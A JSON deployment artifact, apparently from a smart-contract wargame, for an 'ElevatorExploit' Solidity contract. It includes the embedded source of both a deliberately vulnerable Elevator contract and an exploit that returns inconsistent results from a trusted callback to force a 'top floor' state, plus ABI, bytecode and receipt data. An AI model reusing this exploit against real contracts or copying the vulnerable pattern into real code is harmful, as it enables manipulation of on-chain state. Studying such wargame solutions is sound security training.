{
  "address": "0x5D916CC5f39FF00B4FC1bcf54873E4bBb52cad18",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_elevator",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_floor",
          "type": "uint256"
        }
      ],
      "name": "changeFloor",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "isLastFloor",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "transactionHash": "0x774b157b52a252371b20fcbc3c9d51fd68c63ff1efb36f9a72badcbfd7d18f84",
  "receipt": {
    "to": null,
    "from": "0xd7Dd548772fF126999a1a02640beFA34C2ce470B",
    "contractAddress": "0x5D916CC5f39FF00B4FC1bcf54873E4bBb52cad18",
    "transactionIndex": 29,
    "gasUsed": "231637",
    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
    "blockHash": "0x68b6ddb4f372a55a0efb6d1d0c06c6026291f8c7de072696c425589ebc630915",
    "transactionHash": "0x774b157b52a252371b20fcbc3c9d51fd68c63ff1efb36f9a72badcbfd7d18f84",
    "logs": [],
    "blockNumber": 8266824,
    "cumulativeGasUsed": "7018911",
    "status": 1,
    "byzantium": true
  },
  "args": [
    "0x20b06e5D70c54eDd22B8D62DD93A88475542474F"
  ],
  "numDeployments": 1,
  "solcInputHash": "7f29391485da61c629682af82872169d",
  "metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_elevator\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_floor\",\"type\":\"uint256\"}],\"name\":\"changeFloor\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"isLastFloor\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Elevator.sol\":\"ElevatorExploit\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Elevator.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ninterface Building {\\n    function isLastFloor(uint) external returns (bool);\\n}\\n\\ncontract Elevator {\\n    bool public top;\\n    uint public floor;\\n\\n    function goTo(uint _floor) public {\\n        Building building = Building(msg.sender);\\n\\n        if (!building.isLastFloor(_floor)) {\\n            floor = _floor;\\n            top = building.isLastFloor(floor);\\n        }\\n    }\\n}\\n\\ncontract ElevatorExploit {\\n    Elevator private elevator;\\n    uint ctr;\\n\\n    constructor(address _elevator) {\\n        elevator = Elevator(_elevator);\\n    }\\n\\n    function isLastFloor(uint) external returns (bool) {\\n        ctr++;\\n        if (ctr > 1) return true;\\n        return false;\\n    }\\n\\n    function changeFloor(uint _floor) external {\\n        elevator.goTo(_floor);\\n    }\\n}\\n\",\"keccak256\":\"0xde8b04a8f4258b8d51f0c4789d43d8c83baf6d10e07888ea37d0d42c5654ffa8\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x608060405234801561001057600080fd5b506040516103d83803806103d8833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b6102c1806101176000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80635f9a4bca1461003b578063de7337a11461006b575b600080fd5b61005560048036038101906100509190610187565b610087565b60405161006291906101cf565b60405180910390f35b61008560048036038101906100809190610187565b6100be565b005b60006001600081548092919061009c90610219565b91905055506001805411156100b457600190506100b9565b600090505b919050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ed9a7134826040518263ffffffff1660e01b81526004016101179190610270565b600060405180830381600087803b15801561013157600080fd5b505af1158015610145573d6000803e3d6000fd5b5050505050565b600080fd5b6000819050919050565b61016481610151565b811461016f57600080fd5b50565b6000813590506101818161015b565b92915050565b60006020828403121561019d5761019c61014c565b5b60006101ab84828501610172565b91505092915050565b60008115159050919050565b6101c9816101b4565b82525050565b60006020820190506101e460008301846101c0565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061022482610151565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203610256576102556101ea565b5b600182019050919050565b61026a81610151565b82525050565b60006020820190506102856000830184610261565b9291505056fea2646970667358221220ce1dfe759b3c1081ba5d6ec6e4ca9aa8b36060e5f02e1e1560d20d10ec6accf164736f6c63430008110033",
  "deployedBytecode": "0x608060405234801561001057600080fd5b50600436106100365760003560e01c80635f9a4bca1461003b578063de7337a11461006b575b600080fd5b61005560048036038101906100509190610187565b610087565b60405161006291906101cf565b60405180910390f35b61008560048036038101906100809190610187565b6100be565b005b60006001600081548092919061009c90610219565b91905055506001805411156100b457600190506100b9565b600090505b919050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ed9a7134826040518263ffffffff1660e01b81526004016101179190610270565b600060405180830381600087803b15801561013157600080fd5b505af1158015610145573d6000803e3d6000fd5b5050505050565b600080fd5b6000819050919050565b61016481610151565b811461016f57600080fd5b50565b6000813590506101818161015b565b92915050565b60006020828403121561019d5761019c61014c565b5b60006101ab84828501610172565b91505092915050565b60008115159050919050565b6101c9816101b4565b82525050565b60006020820190506101e460008301846101c0565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061022482610151565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203610256576102556101ea565b5b600182019050919050565b61026a81610151565b82525050565b60006020820190506102856000830184610261565b9291505056fea2646970667358221220ce1dfe759b3c1081ba5d6ec6e4ca9aa8b36060e5f02e1e1560d20d10ec6accf164736f6c63430008110033",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 49,
        "contract": "contracts/Elevator.sol:ElevatorExploit",
        "label": "elevator",
        "offset": 0,
        "slot": "0",
        "type": "t_contract(Elevator)46"
      },
      {
        "astId": 51,
        "contract": "contracts/Elevator.sol:ElevatorExploit",
        "label": "ctr",
        "offset": 0,
        "slot": "1",
        "type": "t_uint256"
      }
    ],
    "types": {
      "t_contract(Elevator)46": {
        "encoding": "inplace",
        "label": "contract Elevator",
        "numberOfBytes": "20"
      },
      "t_uint256": {
        "encoding": "inplace",
        "label": "uint256",
        "numberOfBytes": "32"
      }
    }
  }
}